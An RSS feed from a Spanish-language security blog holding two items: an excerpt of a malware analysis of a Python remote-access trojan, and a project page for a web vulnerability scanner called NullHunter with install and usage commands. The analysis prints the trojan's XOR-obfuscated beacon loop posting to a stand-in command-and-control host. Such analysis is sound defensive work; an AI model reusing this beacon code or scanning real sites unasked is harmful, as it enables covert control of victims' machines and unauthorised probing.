<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Python on StaryDarkz</title><link>https://starydarkz.github.io/tags/python/</link><description>Recent content in Python on StaryDarkz</description><generator>Hugo</generator><language>es-419</language><lastBuildDate>Wed, 20 Nov 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://starydarkz.github.io/tags/python/index.xml" rel="self" type="application/rss+xml"/><item><title>Análisis de RAT escrito en Python</title><link>https://starydarkz.github.io/posts/rat-python-analisis/</link><pubDate>Wed, 20 Nov 2024 00:00:00 +0000</pubDate><guid>https://starydarkz.github.io/posts/rat-python-analisis/</guid><description>&lt;h2 id="muestra-analizada"&gt;Muestra analizada&lt;/h2&gt;
&lt;p&gt;Hash SHA256: &lt;code&gt;a1b2c3d4e5f6...&lt;/code&gt; — capturado en entorno sandbox aislado.&lt;/p&gt;
&lt;h2 id="comunicación-c2"&gt;Comunicación C2&lt;/h2&gt;
&lt;p&gt;El RAT utiliza HTTP sobre puerto 8080 con cifrado XOR básico:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;xor_encrypt&lt;/span&gt;(data, key):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2&lt;/span&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; bytes([b &lt;span style="color:#f92672"&gt;^&lt;/span&gt; key[i &lt;span style="color:#f92672"&gt;%&lt;/span&gt; len(key)] &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i, b &lt;span style="color:#f92672"&gt;in&lt;/span&gt; enumerate(data)])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4&lt;/span&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Beacon al C2 cada 30 segundos&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5&lt;/span&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; time&lt;span style="color:#f92672"&gt;,&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6&lt;/span&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;7&lt;/span&gt;&lt;span&gt; r &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;post(&lt;span style="color:#e6db74"&gt;&amp;#34;http://c2.malicious.example/beacon&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;8&lt;/span&gt;&lt;span&gt; data&lt;span style="color:#f92672"&gt;=&lt;/span&gt;xor_encrypt(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;alive&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;secret&amp;#34;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;9&lt;/span&gt;&lt;span&gt; time&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sleep(&lt;span style="color:#ae81ff"&gt;30&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="mecanismo-de-persistencia"&gt;Mecanismo de persistencia&lt;/h2&gt;
&lt;p&gt;Añade una clave de registro en Windows:&lt;/p&gt;</description></item><item><title>NullHunter</title><link>https://starydarkz.github.io/proyectos/nullhunter/</link><pubDate>Tue, 01 Oct 2024 00:00:00 +0000</pubDate><guid>https://starydarkz.github.io/proyectos/nullhunter/</guid><description>&lt;h2 id="qué-hace"&gt;¿Qué hace?&lt;/h2&gt;
&lt;p&gt;NullHunter es un scanner de vulnerabilidades web que automatiza la detección de las vulnerabilidades del OWASP Top 10. Diseñado para ser rápido, extensible y fácil de usar.&lt;/p&gt;
&lt;h2 id="instalación"&gt;Instalación&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1&lt;/span&gt;&lt;span&gt;git clone https://github.com/StarydDarkz/NullHunter
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2&lt;/span&gt;&lt;span&gt;cd NullHunter
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3&lt;/span&gt;&lt;span&gt;pip install -r requirements.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="uso-básico"&gt;Uso básico&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Scan completo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2&lt;/span&gt;&lt;span&gt;python nullhunter.py -u https://target.com --full
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4&lt;/span&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Solo SQLi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5&lt;/span&gt;&lt;span&gt;python nullhunter.py -u https://target.com --sqli
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6&lt;/span&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;7&lt;/span&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# Con output en JSON&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;8&lt;/span&gt;&lt;span&gt;python nullhunter.py -u https://target.com --full -o report.json
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="características"&gt;Características&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Detección de SQL Injection (error-based, blind, time-based)&lt;/li&gt;
&lt;li&gt;XSS reflected y stored&lt;/li&gt;
&lt;li&gt;SSRF básico&lt;/li&gt;
&lt;li&gt;Path traversal&lt;/li&gt;
&lt;li&gt;Generación de reportes en HTML/JSON&lt;/li&gt;
&lt;li&gt;Soporte para proxies (Burp Suite)&lt;/li&gt;
&lt;/ul&gt;</description></item></channel></rss>